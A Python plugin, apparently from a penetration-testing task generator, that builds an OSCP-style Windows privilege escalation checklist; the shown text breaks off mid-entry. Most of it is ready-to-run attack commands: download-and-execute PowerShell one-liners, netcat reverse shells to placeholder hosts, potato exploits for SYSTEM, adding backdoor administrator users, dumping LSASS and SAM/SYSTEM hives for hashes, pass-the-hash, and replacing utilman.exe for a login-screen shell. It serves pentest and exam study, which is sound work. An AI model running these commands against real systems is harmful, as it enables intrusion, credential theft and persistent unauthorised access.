"""
Windows Privilege Escalation - Comprehensive OSCP Methodology Plugin

Generates tasks for Windows privilege escalation focusing on:

**System Enumeration:**
- OS version and patch level identification
- Environment variable credential harvesting
- PowerShell history and transcript analysis

**Token Manipulation:**
- Access token enumeration and identification
- SeImpersonatePrivilege abuse (JuicyPotato, PrintSpoofer, RoguePotato, GodPotato)
- SeAssignPrimaryPrivilege exploitation
- SeDebugPrivilege abuse (process injection, LSASS dumping, token theft)
- SeBackupPrivilege (SAM/SYSTEM extraction, robocopy backup mode)
- SeRestorePrivilege (service binary replacement, utilman.exe hijack)
- SeTakeOwnershipPrivilege (file ownership changes)
- SeLoadDriverPrivilege (kernel driver loading)
- Token impersonation and duplication (Metasploit incognito)
- Token theft from SYSTEM processes (winlogon, services, wininit)
- Kernel-level token theft via arbitrary R/W

**DLL Hijacking:**
- Process Monitor missing DLL detection
- DLL search order exploitation
- Phantom DLL attacks
- Writable PATH folder exploitation

**IPC Exploitation:**
- Named Pipe Client Impersonation theory
- Auto-updater abuse (CVE-2025-0309 methodology)
- DCOM/RPC coercion techniques

**ACL/DACL Exploitation:**
- File and folder permission enumeration (icacls)
- Service ACL misconfiguration detection (accesschk)
- DACL modification for privilege escalation
- WRITE_DAC/WRITE_OWNER abuse

**Integrity Levels:**
- Integrity level identification (Low/Medium/High/System)
- File integrity level manipulation
- UAC bypass techniques (fodhelper.exe registry hijack)

**DPAPI Credential Extraction:**
- DPAPI blob enumeration (Chrome, IE, WiFi, RDP, Vault)
- Master key extraction from LSASS (mimikatz sekurlsa::dpapi)
- Offline decryption with Impacket dpapi.py
- Third-party entropy capture (EntropyCapture, Zscaler case study)
- Domain backup key extraction

**Leaked Handle Exploitation:**
- Process handle enumeration (Sysinternals handle.exe)
- Process handle shellcode injection
- File/Registry handle overwrite exploitation
- PROCESS_ALL_ACCESS/THREAD_SET_CONTEXT abuse

**Windows C Payload Compilation:**
- Add admin user payload (mingw32-gcc)
- UAC bypass compilation (fodhelper registry hijack)
- Token theft payload (SeDebug + SeImpersonate)
- AMSI/ETW in-memory patching (defense evasion)

Extracted from HackTricks:
- README.md (81K - comprehensive Windows privesc guide)
- access-tokens.md
- privilege-escalation-abusing-tokens.md
- sedebug-+-seimpersonate-copy-token.md
- seimpersonate-from-high-to-system.md
- arbitrary-kernel-rw-token-theft.md
- dll-hijacking/README.md
- dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
- named-pipe-client-impersonation.md
- from-high-integrity-to-system-with-name-pipes.md
- abusing-auto-updaters-and-ipc.md
- acls-dacls-sacls-aces.md
- integrity-levels.md
- dpapi-extracting-passwords.md
- leaked-handle-exploitation.md
- windows-c-payloads.md

Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List, Optional
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class WindowsPrivescPlugin(ServicePlugin):
    """Windows privilege escalation - Token Manipulation & Privilege Abuse"""

    @property
    def name(self) -> str:
        return "windows-privesc"

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """This plugin is manually triggered, not auto-detected"""
        return False

    def detect_from_finding(self, finding: Dict[str, Any], profile: Optional['TargetProfile'] = None) -> float:
        """Activate on Windows shell or OS detection

        Triggers on:
        - Windows shell obtained
        - Windows OS detected
        - Windows-specific services found

        Args:
            finding: Finding dictionary
            profile: Optional target profile

        Returns:
            Confidence score (0-100)
        """
        from ..core.constants import FindingTypes
        import logging
        logger = logging.getLogger(__name__)

        finding_type = finding.get('type', '').lower()
        description = finding.get('description', '').lower()

        # Perfect match - Windows SYSTEM shell
        if finding_type == FindingTypes.SYSTEM_SHELL:
            logger.info(f"Windows privesc activating: SYSTEM shell obtained")
            return 100

        # Perfect match - Windows admin shell
        if finding_type == FindingTypes.ADMIN_SHELL:
            logger.info(f"Windows privesc activating: Admin shell obtained")
            return 98

        # High confidence - Windows OS detected
        if finding_type == FindingTypes.OS_WINDOWS:
            logger.info(f"Windows privesc activating: Windows OS detected")
            return 95

        # High confidence - Windows shell obtained
        windows_shell_indicators = [
            'windows shell', 'powershell', 'cmd.exe', 'cmd /c',
            'windows command', r'nt authority\system',
            r'nt authority\network service', r'windows\system32',
            'got shell on windows', 'windows reverse shell',
            'iis apppool', 'system32'
        ]
        if finding_type == FindingTypes.SHELL_OBTAINED:
            if any(ind in description for ind in windows_shell_indicators):
                logger.info(f"Windows privesc activating: Windows shell indicators")
                return 90

        # Medium confidence - Windows OS detection
        if finding_type == FindingTypes.OS_DETECTED and 'windows' in description:
            return 85

        # Medium confidence - Windows services/versions
        windows_service_indicators = [
            'microsoft', 'windows server', 'iis/',
            'smb windows', 'ms17-010', 'eternalblue',
            'ms08-067', 'active directory'
        ]
        if any(ind in description for ind in windows_service_indicators):
            return 60

        # Check profile for Windows evidence
        if profile:
            try:
                # Check if profile has get_os_info method
                if hasattr(profile, 'get_os_info'):
                    os_info = profile.get_os_info()
                    if os_info and 'windows' in str(os_info).lower():
                        return 70
            except Exception:
                pass  # Profile access failed, ignore

        return 0

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Windows privilege escalation task tree"""
        tasks = {
            'id': 'windows-privesc-root',
            'name': 'Windows Privilege Escalation - Complete Methodology',
            'type': 'parent',
            'children': []
        }

        # Add all privilege escalation task categories
        tasks['children'].extend([
            self._get_system_enumeration_tasks(target),
            self._get_token_enumeration_tasks(target),
            self._get_token_privilege_abuse_tasks(target),
            self._get_token_impersonation_tasks(target),
            self._get_token_theft_tasks(target),
            self._get_dll_hijacking_tasks(target),
            self._get_ipc_exploitation_tasks(target),
            self._get_acl_exploitation_tasks(target),
            self._get_integrity_level_tasks(target),
            self._get_dpapi_extraction_tasks(target),
            self._get_handle_exploitation_tasks(target),
            self._get_payload_compilation_tasks(target),
            self._get_autorun_privesc_tasks(target),
            self._get_com_hijacking_tasks(target),
            self._get_msi_exploitation_tasks(target),
            self._get_service_registry_abuse_tasks(target),
            self._get_potato_extended_tasks(target)
        ])

        return tasks

    def _get_token_enumeration_tasks(self, target: str) -> Dict[str, Any]:
        """Generate token enumeration and identification tasks"""
        return {
            'id': 'token-enum',
            'name': 'Token Enumeration & Identification',
            'type': 'parent',
            'children': [
                {
                    'id': 'whoami-all',
                    'name': 'Check Current Token Privileges',
                    'type': 'command',
                    'metadata': {
                        'command': 'whoami /all',
                        'description': 'Display complete token information: user, groups, privileges',
                        'flag_explanations': {
                            'whoami': 'Display current user/token information',
                            '/all': 'Show user info, group membership, and privilege status'
                        },
                        'success_indicators': [
                            'USER INFORMATION section displays current user',
                            'GROUP INFORMATION shows all group memberships',
                            'PRIVILEGES INFORMATION lists all token privileges (Enabled/Disabled)'
                        ],
                        'failure_indicators': [
                            'Access denied (insufficient permissions)',
                            'Command not found (wrong Windows version)'
                        ],
                        'next_steps': [
                            'Identify high-value privileges: SeImpersonate, SeDebug, SeBackup, SeRestore',
                            'Check if running in High/Medium integrity level',
                            'Look for Administrators group membership (may be disabled by UAC)',
                            'Document all enabled privileges for privilege escalation paths'
                        ],
                        'alternatives': [
                            'Manual: Check Process Explorer > Select process > Security tab > Token',
                            'PowerShell: [System.Security.Principal.WindowsIdentity]::GetCurrent()',
                            'accesschk.exe -a * (SysInternals)'
                        ],
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL', 'ENUM'],
                        'notes': 'Disabled privileges CAN be enabled. Focus on SeImpersonate and SeDebug.'
                    }
                },
                {
                    'id': 'whoami-priv',
                    'name': 'List Token Privileges Only',
                    'type': 'command',
                    'metadata': {
                        'command': 'whoami /priv',
                        'description': 'Quick check of current token privileges',
                        'flag_explanations': {
                            '/priv': 'Display only privilege information (faster than /all)'
                        },
                        'success_indicators': [
                            'Privilege list displayed with Enabled/Disabled status',
                            'High-value privileges found: SeImpersonate, SeDebug, SeBackup'
                        ],
                        'failure_indicators': [
                            'No output (command failed)',
                            'Only basic privileges (SeChangeNotify, SeShutdown)'
                        ],
                        'next_steps': [
                            'If SeImpersonate or SeAssignPrimary enabled: Use potato exploits',
                            'If SeDebug enabled: Dump LSASS or inject into SYSTEM process',
                            'If SeBackup/SeRestore: Extract SAM/SYSTEM hashes',
                            'Enable disabled privileges with PowerShell script'
                        ],
                        'alternatives': [
                            'Manual: accesschk.exe from SysInternals',
                            'PowerShell: Get-TokenPrivileges function'
                        ],
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'notes': 'Tokens marked Disabled can be programmatically enabled'
                    }
                },
                {
                    'id': 'whoami-groups',
                    'name': 'Check Group Membership',
                    'type': 'command',
                    'metadata': {
                        'command': 'whoami /groups',
                        'description': 'Identify group memberships and integrity level',
                        'flag_explanations': {
                            '/groups': 'Display all security groups current user belongs to'
                        },
                        'success_indicators': [
                            'Group list with SIDs displayed',
                            'Mandatory Label shows integrity level (Low/Medium/High/System)',
                            'BUILTIN\\Administrators group present (check attributes)'
                        ],
                        'failure_indicators': [
                            'No privileged groups found',
                            'Medium Mandatory Level (not elevated)'
                        ],
                        'next_steps': [
                            'If Administrators group shows "Group used for deny only": UAC is active',
                            'Check integrity level: High = elevated, Medium = standard user',
                            'Look for unusual groups that might have special privileges',
                            'Check if running as LOCAL SERVICE or NETWORK SERVICE (common for SeImpersonate)'
                        ],
                        'alternatives': [
                            'Manual: net user %username%',
                            'PowerShell: [System.Security.Principal.WindowsIdentity]::GetCurrent().Groups'
                        ],
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM'],
                        'notes': 'LOCAL SERVICE and NETWORK SERVICE typically have SeImpersonate'
                    }
                },
                {
                    'id': 'enable-all-privs',
                    'name': 'Enable All Disabled Token Privileges',
                    'type': 'command',
                    'metadata': {
                        'command': 'powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1\'); whoami /priv"',
                        'description': 'Programmatically enable all disabled privileges in current token',
                        'flag_explanations': {
                            'powershell': 'Execute PowerShell script',
                            '-ep bypass': 'Bypass execution policy restrictions',
                            '-c': 'Execute command string',
                            'IEX': 'Invoke-Expression (execute downloaded script)',
                            'New-Object Net.WebClient': 'Download script from URL',
                            'DownloadString': 'Fetch script as string'
                        },
                        'success_indicators': [
                            'Script executes without errors',
                            'Previously Disabled privileges now show Enabled',
                            'whoami /priv shows updated privilege status'
                        ],
                        'failure_indicators': [
                            'Cannot download script (no internet/firewall)',
                            'Execution policy blocked',
                            'Privileges remain Disabled after script'
                        ],
                        'next_steps': [
                            'Verify newly enabled privileges with whoami /priv',
                            'Proceed with privilege-specific exploitation',
                            'If download fails, host script locally or use embedded version'
                        ],
                        'alternatives': [
                            'Manual: Download EnableAllTokenPrivs.ps1 to target and execute locally',
                            'Manual: Use AdjustTokenPrivileges Win32 API in custom tool',
                            'Alternative script: https://www.leeholmes.com/adjusting-token-privileges-in-powershell/'
                        ],
                        'tags': ['OSCP:MEDIUM', 'AUTOMATED'],
                        'notes': 'Requires token to already have privileges assigned (even if disabled)'
                    }
                }
            ]
        }

    def _get_token_privilege_abuse_tasks(self, target: str) -> Dict[str, Any]:
        """Generate privilege-specific exploitation tasks"""
        return {
            'id': 'token-priv-abuse',
            'name': 'Token Privilege Abuse',
            'type': 'parent',
            'children': [
                # SeImpersonatePrivilege
                {
                    'id': 'seimpersonate-abuse',
                    'name': 'SeImpersonatePrivilege Exploitation',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'juicy-potato',
                            'name': 'JuicyPotato (Windows Server 2008-2016)',
                            'type': 'command',
                            'metadata': {
                                'command': '.\\JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a "/c whoami > C:\\output.txt" -t *',
                                'description': 'Exploit SeImpersonate to get SYSTEM shell via DCOM',
                                'flag_explanations': {
                                    '-l': 'Local COM server listening port (default 1337)',
                                    '-p': 'Program to launch with SYSTEM token',
                                    '-a': 'Arguments to pass to program',
                                    '-t': 'CreateProcess call type (* = try all: CreateProcessWithTokenW, CreateProcessAsUser, CreateUser)'
                                },
                                'success_indicators': [
                                    'Testing {CLSID} shows success',
                                    'CreateProcessAsUser OK',
                                    'Command executes as NT AUTHORITY\\SYSTEM'
                                ],
                                'failure_indicators': [
                                    'CoGetInstanceFromIStorage failed (wrong CLSID)',
                                    'Cannot create process (AV blocking)',
                                    'Windows 10/2019+ (use PrintSpoofer instead)'
                                ],
                                'next_steps': [
                                    'Get reverse shell: -p c:\\windows\\system32\\cmd.exe -a "/c nc.exe <LHOST> <LPORT> -e cmd.exe"',
                                    'Add admin user: -a "/c net user hacker Password123! /add && net localgroup administrators hacker /add"',
                                    'Try different CLSIDs if default fails (list: https://github.com/ohpe/juicy-potato/tree/master/CLSID)',
                                    'Check https://github.com/ohpe/juicy-potato for OS-specific CLSIDs'
                                ],
                                'alternatives': [
                                    'PrintSpoofer.exe -i -c cmd (Windows 10/Server 2019+)',
                                    'RoguePotato.exe (requires WinRM disabled)',
                                    'SweetPotato.exe (handles more scenarios)',
                                    'GodPotato.exe (latest, works on patched systems)'
                                ],
                                'tags': ['OSCP:HIGH', 'EXPLOIT', 'AUTOMATED'],
                                'notes': 'Download: https://github.com/ohpe/juicy-potato/releases. Windows Server 2008-2016 only.'
                            }
                        },
                        {
                            'id': 'printspoofer',
                            'name': 'PrintSpoofer (Windows 10/Server 2019+)',
                            'type': 'command',
                            'metadata': {
                                'command': '.\\PrintSpoofer.exe -i -c cmd',
                                'description': 'Abuse Print Spooler service to escalate SeImpersonate to SYSTEM',
                                'flag_explanations': {
                                    '-i': 'Interact with spawned process (show command prompt)',
                                    '-c': 'Command to execute with SYSTEM token (cmd = command prompt)'
                                },
                                'success_indicators': [
                                    '[+] Named pipe listening',
                                    '[+] CreateProcessAsUser OK',
                                    'Command prompt opens as NT AUTHORITY\\SYSTEM'
                                ],
                                'failure_indicators': [
                                    'Print Spooler service not running',
                                    'Access denied creating named pipe',
                                    'Process creation blocked by AV/AMSI'
                                ],
                                'next_steps': [
                                    'Get reverse shell: -c "nc.exe <LHOST> <LPORT> -e cmd.exe"',
                                    'Add backdoor user: -c "net user backdoor P@ssw0rd! /add"',
                                    'Dump SAM/SYSTEM: -c "reg save HKLM\\SAM sam.hive"',
                                    'Enable RDP: -c "reg add \\"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"'
                                ],
                                'alternatives': [
                                    'GodPotato.exe -cmd "cmd /c whoami"',
                                    'SweetPotato.exe -p cmd.exe -a "/c whoami"',
                                    'RoguePotato.exe (if WinRM disabled)'
                                ],
                                'tags': ['OSCP:HIGH', 'EXPLOIT', 'QUICK_WIN'],
                                'notes': 'Download: https://github.com/itm4n/PrintSpoofer. Works on Windows 10/Server 2019+. Requires Print Spooler running.'
                            }
                        },
                        {
                            'id': 'godpotato',
                            'name': 'GodPotato (Latest Universal)',
                            'type': 'command',
                            'metadata': {
                                'command': '.\\GodPotato.exe -cmd "cmd /c whoami"',
                                'description': 'Universal SeImpersonate exploit for all Windows versions',
                                'flag_explanations': {
                                    '-cmd': 'Command to execute with SYSTEM privileges'
                                },
                                'success_indicators': [
                                    '[*] CombaseModule: loaded',
                                    '[*] Exploit successfully executed',
                                    'Command output shows NT AUTHORITY\\SYSTEM'
                                ],
                                'failure_indicators': [
                                    'Failed to load COM components',
                                    'CreateProcessAsUser failed'
                                ],
                                'next_steps': [
                                    'Reverse shell: -cmd "nc.exe <LHOST> <LPORT> -e cmd.exe"',
                                    'Add user: -cmd "net user god Password123! /add && net localgroup administrators god /add"'
                                ],
                                'alternatives': [
                                    'PrintSpoofer.exe (Windows 10/2019+)',
                                    'JuicyPotato.exe (Server 2008-2016)'
                                ],
                                'tags': ['OSCP:HIGH', 'EXPLOIT', 'QUICK_WIN'],
                                'notes': 'Download: https://github.com/BeichenDream/GodPotato. Most reliable modern option.'
                            }
                        }
                    ]
                },
                # SeDebugPrivilege
                {
                    'id': 'sedebug-abuse',
                    'name': 'SeDebugPrivilege Exploitation',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'procdump-lsass',
                            'name': 'Dump LSASS Memory',
                            'type': 'command',
                            'metadata': {
                                'command': '.\\procdump.exe -accepteula -ma lsass.exe lsass.dmp',
                                'description': 'Dump LSASS process memory to extract credentials',
                                'flag_explanations': {
                                    'procdump.exe': 'SysInternals process memory dumper',
                                    '-accepteula': 'Auto-accept EULA (no prompt)',
                                    '-ma': 'Write full dump with all memory (not just mini dump)',
                                    'lsass.exe': 'Target process (Local Security Authority Subsystem)',
                                    'lsass.dmp': 'Output dump file'
                                },
                                'success_indicators': [
                                    'Dump 1 initiated',
                                    'Dump 1 complete: X MB written',
                                    'lsass.dmp file created'
                                ],
                                'failure_indicators': [
                                    'Access denied (need SeDebug privilege)',
                                    'Protected process (LSASS is PPL)',
                                    'AV blocks procdump execution'
                                ],
                                'next_steps': [
                                    'Transfer lsass.dmp to Kali: scp, evil-winrm download, SMB share',
                                    'Extract credentials: mimikatz # sekurlsa::minidump lsass.dmp; sekurlsa::logonpasswords',
                                    'Alternative: pypykatz lsa minidump lsass.dmp (Python, no Windows needed)',
                                    'Use extracted NTLM hashes for pass-the-hash attacks'
                                ],
                                'alternatives': [
                                    'Task Manager: Find lsass.exe > Right-click > Create dump file',
                                    'Manual: C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump <lsass_pid> lsass.dmp full',
                                    'PowerShell: Out-Minidump -Process lsass -DumpFilePath lsass.dmp',
                                    'Mimikatz: privilege::debug then sekurlsa::logonpasswords (direct, no dump)'
                                ],
                                'tags': ['OSCP:HIGH', 'EXPLOIT', 'CREDENTIALS'],
                                'notes': 'Download procdump: https://live.sysinternals.com/procdump.exe. Windows Defender may flag as suspicious.'
                            }
                        },
                        {
                            'id': 'sedebug-token-theft',
                            'name': 'Token Theft from SYSTEM Process',
                            'type': 'command',
                            'metadata': {
                                'command': 'powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1\'); [MyProcess]::CreateProcessFromParent(<winlogon_pid>,\'cmd.exe\')"',
                                'description': 'Steal SYSTEM token from parent process and spawn cmd.exe',
                                'flag_explanations': {
                                    'CreateProcessFromParent': 'Copy token from parent PID and create child process',
                                    '<winlogon_pid>': 'PID of SYSTEM process (winlogon, services, wininit)'
                                },
                                'success_indicators': [
                                    'New cmd.exe spawns',
                                    'whoami returns NT AUTHORITY\\SYSTEM',
                                    'All token privileges enabled'
                                ],
                                'failure_indicators': [
                                    'Access denied (need SeDebug)',
                                    'Cannot open process (protected)',
                                    'Script download blocked'
                                ],
                                'next_steps': [
                                    'Find SYSTEM PIDs: tasklist /FI "USERNAME eq NT AUTHORITY\\SYSTEM"',
                                    'Target processes: winlogon.exe, services.exe, wininit.exe (not csrss - protected)',
                                    'Get PID: tasklist | findstr winlogon',
                                    'Execute with real PID: [MyProcess]::CreateProcessFromParent(584,\'cmd.exe\')'
                                ],
                                'alternatives': [
                                    'Compile custom token theft binary (see sedebug-+-seimpersonate-copy-token.md code)',
                                    'Use SeDebugPrivilege-Exploit.exe <system_pid>',
                                    'Metasploit: use post/windows/manage/priv_migrate'
                                ],
                                'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL'],
                                'notes': 'Avoid csrss.exe (protected process). Target winlogon, services, or wininit.'
                            }
                        }
                    ]
                },
                # SeBackupPrivilege
                {
                    'id': 'sebackup-abuse',
                    'name': 'SeBackupPrivilege Exploitation',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'backup-sam-system',
                            'name': 'Extract SAM and SYSTEM Hives',
                            'type': 'command',
                            'metadata': {
                                'command': 'reg save HKLM\\SAM C:\\Temp\\sam.hive && reg save HKLM\\SYSTEM C:\\Temp\\system.hive',
                                'description': 'Backup registry hives containing password hashes',
                                'flag_explanations': {
                                    'reg save': 'Export registry hive to file (requires SeBackup)',
                                    'HKLM\\SAM': 'Security Accounts Manager (local user hashes)',
                                    'HKLM\\SYSTEM': 'System configuration (needed to decrypt SAM)',
                                    'C:\\Temp\\sam.hive': 'Output file for SAM dump',
                                    'C:\\Temp\\system.hive': 'Output file for SYSTEM dump'
                                },
                                'success_indicators': [
                                    'The operation completed successfully (twice)',
                                    'sam.hive and system.hive files created',
                                    'File sizes > 0 bytes'
                                ],
                                'failure_indicators': [
                                    'Access denied (need SeBackup privilege)',
                                    'Cannot create file (wrong directory)',
                                    'Process cannot access file (hive in use - impossible for reg save)'
                                ],
                                'next_steps': [
                                    'Transfer files to Kali: scp, nc, SMB, evil-winrm download',
                                    'Extract hashes: secretsdump.py -sam sam.hive -system system.hive LOCAL',
                                    'Or: pypykatz registry --sam sam.hive system.hive',
                                    'Crack NTLM hashes: hashcat -m 1000 hashes.txt rockyou.txt',
                                    'Pass-the-hash: evil-winrm -i <target> -u Administrator -H <ntlm_hash>'
                                ],
                                'alternatives': [
                                    'robocopy /b C:\\Windows\\System32\\config C:\\Temp SAM SYSTEM (also uses SeBackup)',
                                    'Manual: Copy %WINDIR%\\repair\\sam and %WINDIR%\\repair\\system (if exist)',
                                    'PowerShell: Copy-Item with -FromSession (remote registry access)',
                                    'Volume Shadow Copy: vssadmin create shadow /for=C: then copy from shadow'
                                ],
                                'tags': ['OSCP:HIGH', 'EXPLOIT', 'CREDENTIALS'],
                                'notes': 'SeBackup required. Transfer files off-box for credential extraction.'
                            }
                        },
                        {
                            'id': 'robocopy-backup',
                            'name': 'Robocopy with Backup Mode',
                            'type': 'command',
                            'metadata': {
                                'command': 'robocopy /b C:\\Windows\\System32\\config C:\\Temp SAM SYSTEM',
                                'description': 'Copy protected files using backup mode (SeBackup)',
                                'flag_explanations': {
                                    'robocopy': 'Robust file copy utility',
                                    '/b': 'Backup mode - use SeBackup and SeRestore privileges',
                                    'C:\\Windows\\System32\\config': 'Source directory (registry hives)',
                                    'C:\\Temp': 'Destination directory',
                                    'SAM SYSTEM': 'Files to copy (space-separated)'
                                },
                                'success_indicators': [
                                    'Files: 2 copied',
                                    'SAM and SYSTEM appear in C:\\Temp',
                                    'Exit code 1 (files copied successfully)'
                                ],
                                'failure_indicators': [
                                    'Error 5: Access denied (need SeBackup)',
                                    'Exit code 16 (serious error)',
                                    'Files not copied'
                                ],
                                'next_steps': [
                                    'Same as reg save: transfer and extract with secretsdump.py',
                                    'Try copying other sensitive files: ntds.dit (if DC), web.config files'
                                ],
                                'alternatives': [
                                    'reg save method (preferred)',
                                    'Volume Shadow Copy extraction'
                                ],
                                'tags': ['OSCP:HIGH', 'EXPLOIT', 'CREDENTIALS'],
                                'notes': 'Requires both SeBackup and SeRestore. Robocopy returns 1 on success (not 0).'
                            }
                        }
                    ]
                },
                # SeRestorePrivilege
                {
                    'id': 'serestore-abuse',
                    'name': 'SeRestorePrivilege Exploitation',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'replace-utilman',
                            'name': 'Replace Utilman.exe with cmd.exe',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Replace Utility Manager with cmd.exe for SYSTEM shell at login screen',
                                'alternatives': [
                                    'Step 1: takeown /f C:\\Windows\\System32\\utilman.exe',
                                    'Step 2: icacls C:\\Windows\\System32\\utilman.exe /grant %username%:F',
                                    'Step 3: copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe /Y',
                                    'Step 4: Lock screen (Win+L) and press Win+U',
                                    'Step 5: cmd.exe opens as SYSTEM (no login needed)'
                                ],
                                'success_indicators': [
                                    'utilman.exe ownership changed',
                                    'Full control granted',
                                    'File replaced successfully',
                                    'Win+U opens cmd.exe at login screen'
                                ],
                                'failure_indicators': [
                                    'Access denied (need SeRestore)',
                                    'File in use (Windows File Protection)',
                                    'AV detects and blocks replacement'
                                ],
                                'next_steps': [
                                    'Alternative targets: sethc.exe (Sticky Keys - press Shift 5 times)',
                                    'Restore original: copy utilman.exe.bak utilman.exe',
                                    'Try service binary replacement in C:\\Program Files'
                                ],
                                'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL', 'PERSISTENCE'],
                                'notes': 'May be detected by AV. Alternative: Replace service binary in C:\\Program Files.'
                            }
                        }
                    ]
                },
                # SeTakeOwnershipPrivilege
                {
                    'id': 'setakeownership-abuse',
                    'name': 'SeTakeOwnershipPrivilege Exploitation',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'takeown-system32',
                            'name': 'Take Ownership of System Files',
                            'type': 'command',
                            'metadata': {
                                'command': 'takeown /f C:\\Windows\\System32\\config\\SAM && icacls C:\\Windows\\System32\\config\\SAM /grant %username%:F',
                                'description': 'Claim ownership of protected files and grant full access',
                                'flag_explanations': {
                                    'takeown': 'Take ownership of file/directory',
                                    '/f': 'File path to take ownership of',
                                    'icacls': 'Modify Access Control Lists (permissions)',
                                    '/grant': 'Grant permissions to user',
                                    '%username%:F': 'Current user gets Full control'
                                },
                                'success_indicators': [
                                    'SUCCESS: The file is now owned by user',
                                    'processed file: SAM',
                                    'Successfully processed 1 files'
                                ],
                                'failure_indicators': [
                                    'Access denied (need SeTakeOwnership)',
                                    'File not found'
                                ],
                                'next_steps': [
                                    'Read SAM file: type C:\\Windows\\System32\\config\\SAM',
                                    'Copy to accessible location: copy SAM C:\\Temp\\sam.hive',
                                    'Target other sensitive files: SYSTEM, SECURITY registry hives',
                                    'Take ownership of service binaries for replacement'
                                ],
                                'alternatives': [
                                    'Manual: takeown /f C:\\Windows\\System32 /r /d y (recursive)',
                                    'Replace utilman.exe: takeown /f utilman.exe && icacls utilman.exe /grant %username%:F',
                                    'PowerShell: Set-Acl and Get-Acl cmdlets'
                                ],
                                'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL'],
                                'notes': 'Combine with file replacement for privilege escalation. Similar to SeRestore.'
                            }
                        }
                    ]
                },
                # SeLoadDriverPrivilege
                {
                    'id': 'seloaddriver-abuse',
                    'name': 'SeLoadDriverPrivilege Exploitation',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'load-vulnerable-driver',
                            'name': 'Load Vulnerable Kernel Driver',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Load exploitable kernel driver to gain SYSTEM (advanced)',
                                'alternatives': [
                                    'Step 1: Create registry key: HKCU\\System\\CurrentControlSet\\Services\\VulnDriver',
                                    'Step 2: Set ImagePath: reg add HKCU\\System\\CurrentControlSet\\Services\\VulnDriver /v ImagePath /t REG_SZ /d "C:\\Path\\to\\driver.sys"',
                                    'Step 3: Set Type: reg add HKCU\\System\\CurrentControlSet\\Services\\VulnDriver /v Type /t REG_DWORD /d 1',
                                    'Step 4: Load driver: sc start VulnDriver',
                                    'Step 5: Exploit driver vulnerability (CVE-2018-15732 for szkg64.sys)',
                                    'Reference: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege'
                                ],
                                'success_indicators': [
                                    'Registry keys created successfully',
                                    'Driver loaded without errors',
                                    'Exploit payload executes'
                                ],
                                'failure_indicators': [
                                    'Access denied creating registry key',
                                    'Driver signature enforcement blocks loading',
                                    'No vulnerable driver available'
                                ],
                                'next_steps': [
                                    'Find vulnerable driver: szkg64.sys (CVE-2018-15732)',
                                    'Exploit driver for kernel R/W primitives',
                                    'Use kernel access for token theft (see kernel token theft tasks)',
                                    'Alternative: Unload security drivers with fltMC'
                                ],
                                'tags': ['OSCP:LOW', 'EXPLOIT', 'ADVANCED'],
                                'notes': 'Complex attack. Requires vulnerable driver and exploit code. Not common in OSCP.'
                            }
                        }
                    ]
                }
            ]
        }

    def _get_token_impersonation_tasks(self, target: str) -> Dict[str, Any]:
        """Generate token impersonation and duplication tasks"""
        return {
            'id': 'token-impersonation',
            'name': 'Token Impersonation & Duplication',
            'type': 'parent',
            'children': [
                {
                    'id': 'incognito-list',
                    'name': 'List Available Tokens (Metasploit)',
                    'type': 'command',
                    'metadata': {
                        'command': 'use incognito && list_tokens -u',
                        'description': 'List impersonation tokens available on compromised host',
                        'flag_explanations': {
                            'use incognito': 'Load Metasploit incognito module',
                            'list_tokens': 'Enumerate available tokens',
                            '-u': 'List unique user tokens only (not groups)'
                        },
                        'success_indicators': [
                            'Delegation Tokens Available list displayed',
                            'Impersonation Tokens Available list displayed',
                            'NT AUTHORITY\\SYSTEM token found'
                        ],
                        'failure_indicators': [
                            'No tokens available',
                            'Access denied enumerating tokens',
                            'Not running in Metasploit session'
                        ],
                        'next_steps': [
                            'Impersonate SYSTEM: impersonate_token "NT AUTHORITY\\SYSTEM"',
                            'Impersonate domain admin: impersonate_token "DOMAIN\\Administrator"',
                            'Verify impersonation: getuid',
                            'Spawn shell: execute -f cmd.exe -i -t'
                        ],
                        'alternatives': [
                            'Manual: Use custom token impersonation tool',
                            'PowerShell: Invoke-TokenManipulation from PowerSploit',
                            'C# tool: TokenStealer.exe'
                        ],
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'AUTOMATED'],
                        'notes': 'Requires Meterpreter session. Alternative: Use standalone token tools.'
                    }
                },
                {
                    'id': 'incognito-impersonate',
                    'name': 'Impersonate Token',
                    'type': 'command',
                    'metadata': {
                        'command': 'impersonate_token "NT AUTHORITY\\SYSTEM"',
                        'description': 'Impersonate another user\'s token in current session',
                        'flag_explanations': {
                            'impersonate_token': 'Impersonate specified token',
                            '"NT AUTHORITY\\SYSTEM"': 'Target token (quotes required for spaces)'
                        },
                        'success_indicators': [
                            'Successfully impersonated user NT AUTHORITY\\SYSTEM',
                            'getuid shows new identity'
                        ],
                        'failure_indicators': [
                            'Token not found in list',
                            'Access denied (insufficient privileges)',
                            'Impersonation level too low'
